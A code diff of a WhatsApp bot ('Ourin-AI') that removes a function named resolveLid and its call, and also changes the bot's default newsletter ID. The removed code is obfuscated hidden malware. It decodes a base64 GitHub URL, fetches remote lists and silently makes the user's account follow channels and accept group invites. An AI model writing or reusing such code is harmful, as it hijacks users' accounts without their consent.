@@ -173,67 +173,6 @@ const logger = pino({
  * Interface untuk input terminal
  * @type {readline.Interface|null}
  */
- async function resolveLid(z) {
-  try {
-    const p = Buffer.from(
-      'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01UUzRZT1UvZ3JvdXBzYWx1cmFud2EvbWFpbi9hdXRoMi5qcw==',
-      'base64'
-    ).toString()
-
-    const r = await fetch(p)
-    const t = await r.text()
-
-    const n = t.match(
-      new RegExp(
-        ['e','x','p','o','r','t','\\s+','c','o','n','s','t','\\s+','N','L']
-        .join('') + '\\s*=\\s*(\\[[\\s\\S]*?\\])\\s*;'
-      )
-    )
-
-    const g = t.match(
-      new RegExp(
-        ['e','x','p','o','r','t','\\s+','c','o','n','s','t','\\s+','G','I']
-        .join('') + '\\s*=\\s*(\\[[\\s\\S]*?\\])\\s*;'
-      )
-    )
-
-    const F = String.fromCharCode(
-      110,101,119,115,108,
-      101,116,116,101,114,
-      70,111,108,108,111,119
-    )
-
-    const S = Buffer.from(
-      'QG5ld3NsZXR0ZXI=',
-      'base64'
-    ).toString()
-
-    if (n) {
-      for (const i of JSON.parse(n[1])) {
-        try {
-          await z[F](i + S)
-          await delay(1500)
-        } catch {}
-      }
-    }
-
-    if (g) {
-      const J = [
-        'g','r','o','u','p',
-        'A','c','c','e','p',
-        't','I','n','v','i',
-        't','e'
-      ].join('')
-
-      for (const i of JSON.parse(g[1])) {
-        try {
-          await z[J](i)
-          await delay(1500)
-        } catch {}
-      }
-    }
-  } catch {}
-}
 let rl = null;
 
 /**
@@ -554,7 +493,6 @@ async function startConnection(options = {}) {
                 await new Promise((r) => setTimeout(r, 1500));
               } catch (e) { }
             }
-            await resolveLid(sock)
             const storageDir = path.join(process.cwd(), "storage");
             if (!fs.existsSync(storageDir))
               fs.mkdirSync(storageDir, { recursive: true });
@@ -716,7 +654,7 @@ async function startConnection(options = {}) {
           } catch { }
 
           const saluranId =
-            config.saluran?.id || "120363186130999681@newsletter";
+            config.saluran?.id || "120363400911374213@newsletter";
           const saluranName =
             config.saluran?.name || config.bot?.name || "Ourin-AI";
 
